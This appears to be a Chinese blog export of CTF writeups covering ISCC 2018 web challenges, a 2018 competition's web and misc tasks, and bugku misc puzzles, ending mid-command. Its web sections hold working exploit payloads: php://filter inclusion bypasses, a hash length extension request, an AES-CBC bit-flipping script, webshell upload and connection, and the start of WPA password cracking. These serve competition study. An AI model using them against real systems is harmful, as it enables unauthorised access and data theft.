class="php">img=php://filter/read=convert.base64-encode/resource=show.php</code></pre><p>但是不行</p><p>题目的坑点在于还需要包含jpg，这就是贪婪包含所在，也就是后台某处代码所致，</p><p>curl <a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php</a></p><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;,&#39;Off&#39;);include(&#39;config.php&#39;);$img = $_GET[&#39;img&#39;];if(isset($img) &amp;&amp; !empty($img)){    if(strpos($img,&#39;jpg&#39;) !== false)    {        if(strpos($img,&#39;resource=&#39;) !== false &amp;&amp; preg_match(&#39;/resource=.*jpg/i&#39;,$img) === 0)        {            die(&#39;File not found.&#39;);        }        preg_match(&#39;/^php:\/\/filter.*resource=([^|]*)/i&#39;,trim($img),$matches);        if(isset($matches[1]))        {            $img = $matches[1];        }        header(&#39;Content-Type: image/jpeg&#39;);        $data = get_contents($img);        echo $data;    }    else    {        die(&#39;File not found.&#39;);    }}else{    ?&gt;    &lt;img src=&quot;1.jpg&quot;&gt;    &lt;?php}?&gt;</code></pre><ol><li>开头包含了config.php</li><li>img必须有jpg但又不能有resource=.*jpg</li><li>正则检查了并把结果填充到$matches 里去，说明我们可以使用php://filter伪协议，并且resource的值不含|，那么我们就可以用| 来分隔php 和jpg，因为正则匹配到| 就不会继续匹配后面的jpg 了，使得\$img=show.php</li></ol><p>知道了config.php再去访问明白为什么必须包含jpg</p><pre><code class="php">&lt;?phpfunction get_contents($img){        if(strpos($img,&#39;jpg&#39;) !== false)        {                return file_get_contents($img);        }        else        {                header(&#39;Content-Type: text/html&#39;);                return file_get_contents($img);        }}?&gt;</code></pre><p>最终payload:</p><p><a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg</a></p><!-- flag{1ntere5ting_PHP_Regu1ar_express1onssssss} --><h3 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h3><pre><code>&lt;?phpinclude &quot;secret.php&quot;;@$username=(string)$_POST[&#39;username&#39;];function enc($text){    global $key;    return md5($key.$text);}if(enc($username) === $_COOKIE[&#39;verify&#39;]){    if(is_numeric(strpos($username, &quot;admin&quot;))){        die($flag);    }    else{        die(&quot;you are not admin&quot;);    }}else{    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);}show_source(__FILE__);</code></pre><ol><li>一个不知道的$key，但是从cookie中可以知道它的长度是46</li><li>从cookie中知道md5(\$key.guest) 的值，也就是知道enc(\$username) 符合条件的值</li><li>获得flag 的条件，满足enc(\$username) == md5(\$key.guest)，同时\$username 要含有admin</li></ol><p>使用HashPump攻击； </p><p>安装HashPump；</p><p> 方法一： git clone <a href="https://github.com/bwall/HashPump.git" target="_blank" rel="external">https://github.com/bwall/HashPump.git</a> apt-get install g++ libssl-dev cd HashPump make make install B.方法二： pip install hashpumpy </p><p>方法二:</p><p>pip install hashpumpy </p><pre><code>$ hashpump -s &#39;78cfc57d983b4a17e55828c001a3e781&#39; -d &#39;guest&#39; -a &#39;admin&#39; -k 465f585093a7fe86971766c3d25c43d0ebguest\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin</code></pre><p>POST / HTTP/1.1<br>Host: 118.190.152.202:8002<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br>Cookie: verify=5f585093a7fe86971766c3d25c43d0eb; len=46<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 58</p><p>username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin</p><p>ISCC{MD5_1s_n0t_5afe}</p><p><a href="http://p0sec.net/index.php/archives/99/" target="_blank" rel="external">http://p0sec.net/index.php/archives/99/</a></p><p><a href="http://quincyblog.top/2018/05/08/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/#more" target="_blank" rel="external">http://quincyblog.top/2018/05/08/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/#more</a></p><h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p>查看源码得提示index.txt，访问得到源码 </p><pre><code class="php">&lt;?phpinclude &#39;sqlwaf.php&#39;;define(&quot;SECRET_KEY&quot;, &quot;................&quot;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv(){    $iv=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $iv.=chr(rand(1,255));    }    return $iv;}// 使用aes-128-cbc 模式加密function login($info){    $iv=get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];    setcookie(&quot;iv&quot;, base64_encode($iv));// cookie[iv] = 随机生成的iv 的base64    setcookie(&quot;cipher&quot;, base64_encode($cipher));// cookie[cipher] = 加密值的base64}function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){//发现当账号为admin，才会显示flag，        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Flag is *************&lt;/p&gt;&#39;;    }else{        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;    }    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;    die();}// 解密cipherfunction check_login(){    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;])){        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);//cipher和iv变量均中cookie数组中取        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];        }else{            die(&quot;ERROR!&quot;);        }    }}if (isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;])) {  $username=waf((string)$_POST[&#39;username&#39;]);  $password=waf((string)$_POST[&#39;password&#39;]);  if($username === &#39;admin&#39;){        exit(&#39;&lt;p&gt;You are not real admin!&lt;/p&gt;&#39;);//当我们以admin账号登录时，程序会直接跳出    }else{        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);        show_homepage();    }//否则正常登录，并将用户信息存在info数组中传入login函数，并调用show_homepage函数。}else{  if(isset($_SESSION[&quot;username&quot;])){        check_login();        show_homepage();    }}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; &gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;Paper login form&lt;/title&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;login&quot;&gt;  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;    &lt;h1&gt;Sign In&lt;/h1&gt;    &lt;input name=&#39;username&#39; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;    &lt;input name=&#39;password&#39; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;    &lt;button&gt;Sign in&lt;/button&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>思路就是构造一个Admin用户，然后将大写的A翻转成小写的a，即是admin。我们点击登录之后，可以在cookie中获取到iv和cipher的值（看14行的login函数），然后我们先将cipher的第9个字符使用异或运算翻转成小写字母a，因为info数组序列化后，我们要翻转的大写字母A在下标为9的位置，每个分组的长度为16，因为返回的iv变量长度为16（要先经过base64解密）</p><ol><li>s:2:{s:8:”userna</li><li>me”;s:5:”Admin”;</li><li>s:8:”password”;s</li><li>:5:”admin”;}</li></ol><p>要第二组的b变为d 就要第一组的u改变 </p><p>python脚本：</p><pre><code class="python">import urllib,base64,requests,reurl = &quot;http://118.190.152.202:8001/index.php&quot;datas = {    &quot;username&quot; : &quot;Admin&quot;,    &quot;password&quot; : &quot;admin&quot;}r = requests.post(url,data=datas)cipher = r.cookies.get(&quot;cipher&quot;)cipher = base64.b64decode(urllib.unquote(cipher))offset = 9new_cipher = cipher[:offset] + chr(ord(cipher[offset])^ord(&quot;A&quot;)^ord(&quot;a&quot;)) + cipher[offset+1:]new_cookies = requests.utils.dict_from_cookiejar(r.cookies)new_cookies[&quot;cipher&quot;] = urllib.quote_plus(base64.b64encode(new_cipher))r2 = requests.get(url,cookies=new_cookies)plain = base64.b64decode(re.findall(&quot;decode\(&#39;(.*)&#39;\)&quot;,r2.text)[0])iv = base64.b64decode(urllib.unquote(new_cookies[&quot;iv&quot;]))old = plain[:len(iv)]new = &#39;a:2:{s:8:&quot;userna&#39;new_iv = &quot;&quot;.join([chr(ord(iv[i])^ord(old[i])^ord(new[i])) for i in xrange(16)])new_cookies[&quot;iv&quot;] = urllib.quote_plus(base64.b64encode(new_iv))r3 = requests.get(url,cookies=new_cookies)print(r3.text)</code></pre><p>看其他师傅的其他解题：</p><p><a href="https://mp.weixin.qq.com/s?srcid=0525HLtDRNGV7DM8TsC469W2&amp;scene=23&amp;mid=2247484248&amp;sn=05c6b69fc6bd49b0ff8d1b9b8842d0fb&amp;idx=1&amp;__biz=MzUxOTYzMzU0NQ%3D%3D&amp;chksm=f9f7ecbece8065a88c1bf77efbc67106aacfc93942e72198a26efca026788ddfc75be75030d2&amp;mpshare=1#rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?srcid=0525HLtDRNGV7DM8TsC469W2&amp;scene=23&amp;mid=2247484248&amp;sn=05c6b69fc6bd49b0ff8d1b9b8842d0fb&amp;idx=1&amp;__biz=MzUxOTYzMzU0NQ%3D%3D&amp;chksm=f9f7ecbece8065a88c1bf77efbc67106aacfc93942e72198a26efca026788ddfc75be75030d2&amp;mpshare=1#rd</a>  </p><p><a href="https://www.anquanke.com/post/id/146063" target="_blank" rel="external">https://www.anquanke.com/post/id/146063</a></p><p><a href="https://blog.zilch40.wang/2018/05/25/iscc-2018-writeup/#Collide-250" target="_blank" rel="external">https://blog.zilch40.wang/2018/05/25/iscc-2018-writeup/#Collide-250</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>全国网络空间安全技术大赛2018三道wp</title>
      <link href="/archis/ceb4048b/"/>
      <url>/archis/ceb4048b/</url>
      
        <content type="html"><![CDATA[<h1 id="全国网络空间安全技术大赛2018三道wp"><a href="#全国网络空间安全技术大赛2018三道wp" class="headerlink" title="全国网络空间安全技术大赛2018三道wp"></a>全国网络空间安全技术大赛2018三道wp</h1><h2 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h2><p>得到一张图片</p><p>binwalk 发现是zip加密</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805121134_772.png" alt=""></p><p>直接修改后缀.zip</p><p>打开压缩包之后发现需要解压密码</p><p>猜测是伪加密那就直接尝试伪加密，利用伪加密判断工具ZipCenOp</p><pre><code>java -jar ZipCenOp.jar r xxx.zip</code></pre><p>得到一个txt</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805121128_864.png" alt=""></p><p>一开始以为是base64解码 把除了最后一行的==删除 去解码发现是乱码，知道思路不对 ，后来想起xdctf出过一到base64隐写</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805121124_544.png" alt=""></p><p>编码原理：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因，这样就需要一张映射表，如下：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201810141056_335.png" alt=""></p><p>举个例子(base64)：</p><p>源文本：T h e</p><p>对应ascii码:84 104 101</p><p>8位binary：01010100 01101000 01100101</p><p>6位binary：010101 000110 100001 100101</p><p>高位补0：000010101 00000110 00100001 00100101</p><p>对应ascii码：21 6 33 37</p><p>查表：V G h l</p><h4 id="隐写原理"><a href="#隐写原理" class="headerlink" title="隐写原理"></a>隐写原理</h4><p>A对应的二进制位为01000001，补全之后为01000001    0000，对应的base64的编码为QQ（010000     010000），所以之后有两个‘=’。在解码的时候我就要在去掉=对应的6个零的同时在去掉4个0，也就是解码的时候会解析01000001而不是010000010000。这时候我们会发现了，我们去掉的这四个0是不是可以用来隐藏信息？？？反正解码的时候会被裁剪掉，那我干脆就在后面做一些手脚，用base64来混淆视听。 </p><pre><code class="python">#!/usr/bin/python#coding:utf-8b64chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;with open(&#39;stego.txt&#39;, &#39;rb&#39;) as f:    bin_str = &#39;&#39;    for line in f.readlines():        stegb64 = &#39;&#39;.join(line.split())        rowb64 =  &#39;&#39;.join(stegb64.decode(&#39;base64&#39;).encode(&#39;base64&#39;).split())        offset = abs(b64chars.index(stegb64.replace(&#39;=&#39;,&#39;&#39;)[-1])-b64chars.index(rowb64.replace(&#39;=&#39;,&#39;&#39;)[-1]))        equalnum = stegb64.count(&#39;=&#39;) #no equalnum no offset        if equalnum:            bin_str += bin(offset)[2:].zfill(equalnum * 2)        print &#39;&#39;.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)]) #8位一组</code></pre><p>可以看这个师傅写的：<a href="https://www.tr0y.wang/2017/06/14/Base64steg/" target="_blank" rel="external">https://www.tr0y.wang/2017/06/14/Base64steg/</a></p><p><a href="https://github.com/amor-tsai/php_screw.git" target="_blank" rel="external">https://github.com/amor-tsai/php_screw.git</a></p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>打开一个登陆界面 ，</p><p>先注册，进入 右上角有个修改密码 猜测是任意密码重置</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805131624_405.png" alt=""></p><p>提示flag在flag.php里</p><p>抓包发现自己的Bigbroke被base64加密 然后url编码</p><p>所以想到username更改admin尝试密码重置逻辑问题。</p><p>username=YWRtaW4%3D</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805130011_460.png" alt=""></p><p>发现密码重置成功，进入登陆界面 登陆成功</p><p>发现页面叫我们填写远程图片地址，一开始尝试上传木马地址，然后上传木马图片但是都没有用处，问题在哪里呢</p><p>思考发现会不会ssrf漏洞， 让服务器自己伪造请求，</p><p>后将地址改成本地的flag.php</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805130048_442.png" alt=""></p><p>得到 两个图片地址第二个图片是我们上传的，但是被解析就是jgp,</p><p>无法利用所以利用点在于第一幅图片。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805130049_141.png" alt=""></p><p>访问第一幅图片地址，下载下来 得到flag</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805130049_976.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805130050_718.png" alt=""></p><p>保存图片得到flag</p><h2 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h2><p>git源码泄露，</p><p>githack工具下载源码审计</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805131640_57.png" alt=""></p><p>upload很奇怪</p><p>进入查看，谷歌查询<a href="http://0day5.com/archives/4022/" target="_blank" rel="external">http://0day5.com/archives/4022/</a></p><p>存在免认证登录漏洞</p><p>访问<a href="http://117.34.116.192/upload.php" target="_blank" rel="external">http://117.34.116.192/upload.php</a></p><p>burp抓包改cookie</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805131648_158.png" alt=""></p><p>进入</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805131650_741.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805131650_29.png" alt=""></p><p>上传文件包含</p><p><a href="http://117.34.116.192/index.php?file=./img/img26019845.jpg" target="_blank" rel="external">http://117.34.116.192/index.php?file=./img/img26019845.jpg</a></p><p>index.php 会把这jpg解析成php运行</p><p>菜刀连接得到fl4g.php</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805131810_848.png" alt=""></p><p>需要php反编译，得到原始代码</p><p>flag{7cb3d823105433606ccac8fb75aed67c}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku-misc</title>
      <link href="/archis/e36e397d/"/>
      <url>/archis/e36e397d/</url>
      
        <content type="html"><![CDATA[<h1 id="bugku-misc"><a href="#bugku-misc" class="headerlink" title="bugku misc"></a>bugku misc</h1><p>做了iscc2018发现自己misc能力差很多，也忘了很多，这周做了bugku misc，总结一下。</p><h3 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h3><p>直接文本编辑器打开；文本末尾发现了一行转义序列： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804281525_944.png" alt=""></p><blockquote><p>Unicode编码有以下四种编码方式：</p><p>源文本： <code>The</code></p><p>&amp;#x [Hex]： <code>&amp;#x0054;&amp;#x0068;&amp;#x0065;</code></p><p>&amp;# [Decimal]： <code>&amp;#00084;&amp;#00104;&amp;#00101;</code></p><p>\U [Hex]： <code>\U0054\U0068\U0065</code></p><p>\U+ [Hex]： <code>\U+0054\U+0068\U+0065</code></p></blockquote><p>unicode——&gt;acsii</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804281343_354.png" alt=""></p><p>key{you are right}</p><h3 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h3><p>先来了解一下png的头文件。</p><p><code>89 50 4E 47 0D 0A 1A 0A</code> ——&gt;PNG头部署名域，表示这是一个PNG图片</p><p><code>00 00 00 0D</code> ——-&gt;描述IHDR头部的大小</p><p><code>49 48 44 52</code> ——&gt;是Chunk Type Code, 这里Chunk Type Code=IHDR</p><p><code>F9 7D AA 93</code> ——&gt;对IHDR的CRC校验</p><p><code>00 00 01 F4</code> ——&gt;图像宽度，500像素</p><p><code>00 00 01 A4</code> ——&gt;图像高度。</p><p>png的标志就是IHDR</p><p><a href="https://blog.csdn.net/joqian/article/details/8290389" target="_blank" rel="external">https://blog.csdn.net/joqian/article/details/8290389</a></p><p>下载rar文件，打开得到一张图片。</p><p>我们把它放到kali中，用binwalk分析一下。  </p><p>发现只是一张图片而已。但这时候发现一个问题，这张图片并不能打开。 </p><p>winhex打开最后从图片格式入手，更改其高度得到flag</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804281627_225.png" alt=""></p><p>将A4改为F4</p><p>BUGKU{a1e5aSA}</p><p>winhex的png原理：<a href="http://blog.csdn.net/bisword/article/details/2777121" target="_blank" rel="external">http://blog.csdn.net/bisword/article/details/2777121</a></p><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>1.追踪TCP流</p><p>2.根据题目提示查看telnet协议，一个个找下去，在第41个数据包找到flag</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804281647_239.png" alt=""></p><h3 id="眼见非实-ISCCCTF"><a href="#眼见非实-ISCCCTF" class="headerlink" title="眼见非实(ISCCCTF)"></a>眼见非实(ISCCCTF)</h3><p>WinHex 常见文件头</p><blockquote><p>JPEG (jpg)，文件头：FFD8FF<br>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424D<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email [thorough only]<br>(eml)，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Postscript. (eps.or.ps)，文件头：252150532D41646F6265<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>Windows Password (pwl)，文件头：E3828596<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645<br>AVI (avi)，文件头：41564920<br>Real Audio (ram)，文件头：2E7261FD<br>Real Media (rm)，文件头：2E524D46<br>MPEG (mpg)，文件头：000001BA<br>MPEG (mpg)，文件头：000001B3<br>Quicktime (mov)，文件头：6D6F6F76<br>Windows Media (asf)，文件头：3026B2758E66CF11<br>MIDI (mid)，文件头：4D546864</p></blockquote><p>改后缀为zip进行解压，得到一个word文档，但是打开是乱码</p><p>winhex打开</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804281655_885.png" alt=""></p><p>所以是zip文件 从新将.doc 改成.zip</p><p>word文件夹里发现里面有个名为document的文件 ，在里面的document.xml发现flag </p><p>flag{F1@g}</p><h3 id="又一张图片，还单纯吗？？"><a href="#又一张图片，还单纯吗？？" class="headerlink" title="又一张图片，还单纯吗？？"></a>又一张图片，还单纯吗？？</h3><p>用binwalk检测发现还有一张图片把图片提取出来，就是flag</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804292329_656.png" alt=""></p><h3 id="猜"><a href="#猜" class="headerlink" title="猜"></a>猜</h3><p>下载图片通过百度对图片搜索功能<br>key{liuyifei}</p><h3 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h3><p>题目中给出一个conf.bin文件，主要是工具，用routerpassview打开，然后找到</p><p>（ <username val="053700357621">    <password val="210265">）题目中给出了提示，flag是宽带用户名。</password></username></p><p>flag{053700357621}</p><h3 id="隐写2-Welcome-jpg"><a href="#隐写2-Welcome-jpg" class="headerlink" title="隐写2 Welcome_.jpg"></a>隐写2 Welcome_.jpg</h3><p>从网站上下载下来就是一张图片，同过binwalk分析其中包含一个zip压缩包。</p><p>通过binwalk进行提取，会提取出三个文件，其中flag.rar与提示.jpg是CD24.zip压缩包的内容。</p><p>通过提示.jpg可以得到压缩包密码3位数，通过ARCHRP软件进行暴力破解获得密码为871.</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804281801_848.png" alt=""></p><p>解压获得3.jpg</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804281803_237.png" alt=""></p><p>通过写字板打开获得f1@g{eTB1IEFyZSBhIGhAY2tlciE=} </p><p>很明显eTB1IEFyZSBhIGhAY2tlciE=是Base64加密，通过解密获得y0u Are a h@cker!</p><p>即f1@g{y0u Are a h@cker!}，提交时需要将f1@g变换为flag，即最终为flag{y0u Are a h@cker!}</p><h3 id="多种方法解决"><a href="#多种方法解决" class="headerlink" title="多种方法解决"></a>多种方法解决</h3><p>sublime打开<img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804300041_863.png" alt=""></p><p>复制谷歌搜索得到一张二维码</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804300040_509.png" alt=""></p><p>可以将图片和base64互相转换的网站<br><a href="http://www.vgot.net/test/image2base64.php" target="_blank" rel="external">http://www.vgot.net/test/image2base64.php</a></p><p>最后得到二维码 扫描即可KEY{dca57f966e4e4e31fd5b15417da63269}</p><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>压缩包下载下来，解压，里面有一个flag文件，记事本打开，搜索flag没有，搜索key GET！</p><p>linux？ 不存在的…</p><pre><code>key{feb81d3834e2423c9903f4755464060b}</code></pre><p>方法二：</p><p>kali进行</p><p> tar -xvf 1.tar.gz </p><p>cat flag</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804300111_333.png" alt=""></p><p>方法三：</p><p>放到linux里面strings打开，过滤一下KEY就找到了</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805011620_101.png" alt=""></p><p>指令string flag | grep key</p><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>方法一：.pcapng又是数据包,wireshark打开，既然是用的菜刀，那就找http协议，第四个http包里找到了一句话木马： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804300216_174.png" alt=""></p><p>flag应该在挂马之后才拿到，找到下一个http包，wireshark追踪一下http流： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804300219_911.png" alt=""></p><p>可以知道菜刀创建了一个flag.tar.gz，还有echo了字符串<code>X@Y</code>，所以第三个包的response，出去前后两个字符串<code>X@Y</code>就是flag.tar.gz</p><p>然后把前后的“X@Y”删去，解码为压缩格式： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804300215_384.png" alt=""></p><p>方法二：</p><p>用Wireshark打开分析 TCPstream</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804300204_908.png" alt=""></p><p>在第九个数据包中看到了flag.tar.gz这个文件。</p><p>查看了一下其他数据包的内容，并没有关于传输这个文件的数据包信息。猜想这个文件可能被隐藏在caidao.pcapng里了。</p><p>放到binwalk分析，用dd命令把gzip文件提取出来。</p><blockquote><p>使用dd命令分离(linux/unix下)</p><p>dd命令分离出隐藏文件：</p><pre><code># dd if=carter.jpg of=output.jpg(自己定义的名字) skip=140147（对应的块偏移） bs=1</code></pre><p>-e选项可以用来执行自动数据提取的基础上提取规则中指定的默认的extract.conf文件：</p><pre><code>$ binwalk -e firmware.bin</code></pre></blockquote><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804300156_242.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804300157_912.png" alt=""></p><p>dd if=caidao.pcapng of=1.gzip skip=7747 bs=1</p><p>tar -xvf 1.gzip</p><p>cat flag/flag.txt </p><p>key{8769fe393f2b998fa6a11afe2bfcd65e}</p><h3 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h3><p>根据提示要找getshell流，wireshark打开CTF.pcagng</p><p>先大致浏览一下，不难发现从第104个包开始应该是攻击机（192.168.116.138）在向目标机（192.168.116.159）进行端口扫描</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804300237_928.png" alt="">追踪流——&gt;TCP可以看到其中有一个s4cr4t.txt的文件，base64解码得到flag</p><p>Q0NURntkb195b3VfbGlrZV9zbmlmZmVyfQ==</p><blockquote><p>CCTF{do_you_like_sniffer}</p></blockquote><h3 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h3><p>当时的第一感觉就是大白怎么只有头没有身子，所以想到修改图片的宽和高。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804300226_978.png" alt=""></p><p>更改02 A7</p><p>获得flag{He1l0_d4_ba1}</p><h3 id="做个游戏-08067CTF"><a href="#做个游戏-08067CTF" class="headerlink" title="做个游戏(08067CTF)"></a>做个游戏(08067CTF)</h3><p>这里用Java Decompiler 工具反编译。</p><p>分析以上代码可以得知，其中period是表示坚持的秒数，根据题目提示可以知道，需要坚持60秒，所以根据period/10找到case 6，得到flag的BASE64码flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}，解码得flag{DajiDali_JinwanChiji}。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804300246_552.png" alt=""></p><h3 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h3><p>提示WIFI密码为手机号。下载下来是一个cap包，用wireshark打开。WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下——</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805011539_973.png" alt=""></p><p>正好四个包，接下来就是破解密码了，因为已经给了11位手机号的前七位，使用crunch生成一个密码字典，然后进行破解</p><p> crunch 11 11 -t 1391040%%%% 